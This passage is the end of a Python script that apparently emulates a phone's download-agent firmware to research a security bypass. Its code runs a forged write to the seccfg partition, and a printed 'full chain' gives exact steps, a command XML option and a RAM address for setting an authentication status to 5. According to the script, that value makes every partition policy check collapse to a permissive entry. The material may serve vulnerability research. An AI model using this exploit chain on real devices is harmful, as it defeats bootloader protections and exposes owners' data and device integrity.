    rc4, out4 = run_handler(e, post["CMD:WRITE-PARTITION"],
                            cmd_xml("CMD:WRITE-PARTITION",
                                    "<partition>seccfg</partition><source_file>p</source_file>"))
    print(f"[4] CMD:WRITE-PARTITION dispatch after forge: rc={hex(rc4) if isinstance(rc4,int) else rc4} "
          f"deny={deny_hits(out4)}")
    # ---- stage 5: what 5 actually changes: policy lookup collapse ----
    pp = policy_probe(e)
    print(f"[5] policy lookup at status 5: {pp}")
    print("""
SAFEST FULL CHAIN (all steps reversible RAM effects; zero efuse-word writes):
  1. [device] complete SECURITY-SET-FLASH-POLICY with a legitimately signed
     policy (this is the ONLY door: at boot the table holds just 9 commands and
     CMD:WRITE-EFUSE is NOT among them; the fetch-engine clamp also closes the
     heapbait shortcut).
  2. CMD:WRITE-EFUSE, 512-byte debug XML, one option:
         <option address="0x40054C88">5</option>
     -> g_oplus_auth_status := 5.  rc=0.  One 32-bit RAM write.
  3. (optional re-registration in the same session) another SET-FLASH-POLICY
     success re-runs 0x40001A78; status 5 passes the {3,4} gate.
  4. Effects of status 5 (proven below): registrar gate passed; the ==2 extra
     check in the hash-list verifier skipped; EVERY partition->policy lookup
     collapses to the 'oplus_single_mode' entry (flags 0).
  Reversibility: every effect is DA RAM (one global) or efuse-CONTROLLER
  control pokes; a DA reload restores everything.  The chain contains no
  0x11C1xxxx data-word write, no watchdog write, no flash write.
""")
    del e
    return 0

MODES = {"boot": mode_boot, "forge": mode_forge, "unlock-table": mode_unlock_table,
         "clamp-widen": mode_clamp_widen, "full": mode_full}

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[1])
    ap.add_argument("mode", choices=[*MODES, "all"], nargs="?", default="all")
    args = ap.parse_args()
    if args.mode == "all":
        for k, f in MODES.items():
            rc = f()
        sys.exit(0)
    sys.exit(MODES[args.mode]())
